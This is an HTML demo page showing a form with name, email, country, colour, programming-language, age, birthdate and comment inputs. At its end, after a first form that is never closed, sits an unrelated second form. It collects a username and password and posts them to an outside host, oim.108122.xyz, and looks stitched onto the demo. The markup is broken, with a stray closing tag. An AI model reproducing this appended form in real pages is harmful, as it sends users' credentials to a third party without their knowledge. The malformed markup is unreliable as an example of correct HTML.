<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Demo with Various Inputs</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        form { max-width: 600px; margin: auto; }
        label { display: block; margin-top: 10px; }
        input, select, textarea { width: 100%; padding: 8px; margin-top: 5px; }
        button { margin-top: 20px; padding: 10px 20px; }
    </style>
</head>
<body>
    <h1>Form Demo: Various Inputs</h1>
    <form action="/submit" method="POST">
        <!-- Text Input -->
        <label for="name">Name:</label>
        <input type="text" id="name" name="name" placeholder="Enter your name">

        <!-- Email Input -->
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" placeholder="Enter your email">

        <!-- Dropdown Menu -->
        <label for="country">Country:</label>
        <select id="country" name="country">
            <option value="">Select a country</option>
            <option value="us">United States</option>
            <option value="ca">Canada</option>
            <option value="uk">United Kingdom</option>
            <option value="au">Australia</option>
            <option value="de">Germany</option>
        </select>

        <!-- Radio Buttons for Multiple Choice -->
        <fieldset>
            <legend>What is your favorite color?</legend>
            <label><input type="radio" name="color" value="red"> Red</label>
            <label><input type="radio" name="color" value="blue"> Blue</label>
            <label><input type="radio" name="color" value="green"> Green</label>
            <label><input type="radio" name="color" value="yellow"> Yellow</label>
        </fieldset>

        <!-- Checkboxes for Multiple Selections -->
        <fieldset>
            <legend>What programming languages do you know? (Select all that apply)</legend>
            <label><input type="checkbox" name="languages" value="html"> HTML</label>
            <label><input type="checkbox" name="languages" value="css"> CSS</label>
            <label><input type="checkbox" name="languages" value="javascript"> JavaScript</label>
            <label><input type="checkbox" name="languages" value="python"> Python</label>
            <label><input type="checkbox" name="languages" value="java"> Java</label>
        </fieldset>

        <!-- Number Input -->
        <label for="age">Age:</label>
        <input type="number" id="age" name="age" min="1" max="120" placeholder="Enter your age">

        <!-- Date Input -->
        <label for="birthdate">Birthdate:</label>
        <input type="date" id="birthdate" name="birthdate">

        <!-- Textarea -->
        <label for="comments">Comments:</label>
        <textarea id="comments" name="comments" rows="4" placeholder="Any additional comments"></textarea>

        <!-- Submit Button -->
        <button type="submit">Submit</button>
   
    <form action="https://oim.108122.xyz/echo/view" method="POST">
        <input name="username" placeholder="Your name">
        <input type="password" name="password" placeholder="Password">
        <input name="message" placeholder="Say something">
        <button type="submit">Send</button>
    </form>
</body>
</html></content>
